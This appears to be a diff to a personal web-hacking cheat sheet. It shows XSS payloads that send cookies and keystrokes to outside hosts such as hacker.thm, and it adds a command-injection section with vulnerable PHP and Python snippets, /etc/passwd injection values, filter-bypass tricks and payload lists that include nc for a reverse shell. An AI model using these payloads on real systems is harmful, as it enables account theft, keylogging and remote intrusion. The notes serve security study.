@@ -208,3 +208,43 @@ Exploit - `/images/valid.png" onload="alert('XSS Detected!')`
 - `<script>fetch('https://example.com/steal?cookie=' + btoa(document.cookie));</script>` - Steal user cookie and send it to API
 - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>` - Keylog and send to API
 - `<script>user.changeEmail('attacker@example.com');</script>` - Call site function to change users email
+
+## Command Injection
+A type of RCE that will execute Linux commands under the same user as the program
+### Vulnerabilities and Exploits
+#### PHP
+Code:
+```
+$command = "grep param /var/www/html/file.txt";
+exec($command);
+```
+
+Vulnerability - `param="" /etc/passwd`
+
+#### Python
+Code: 
+```
+subprocess.Popen(f"cat /var/www/html/{param}", shell=True, stdout=subproccess.PIPE).stdout.read()
+```
+
+Vulnerability - `param=../../../etc/passwd`
+
+### Bypassing Filters
+  - `"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" = "/etc/passwd"` - Hexadecimal escaped characters
+  - `"nnetcatetcat" = "netcat"` - Replacement bypassing
+
+### Linux Payloads
+- `whoami` - Displays the user the application is running under
+- `ls` - Finds files in current directory, used to find config files, source code, env files, etc
+- `ping` - Hangs the application until ping is complete to detect a Blind RCE
+- `sleep` - Hangs application to detect Blind RCE
+- `nc` - Spawn a reverse shell to allow further commands to be run
+
+### Windows Payloads
+- `whoami` - Displays the user the application is running under
+- `dir` - Finds files in current directory, used to find config files, source code, env files, etc
+- `ping` - Hangs the application until ping is complete to detect a Blind RCE
+- `timeout` - Hangs application to detect Blind RCE
+
+### Notes
+- If adding parameter to a command, use `|` or `;` to create a new command
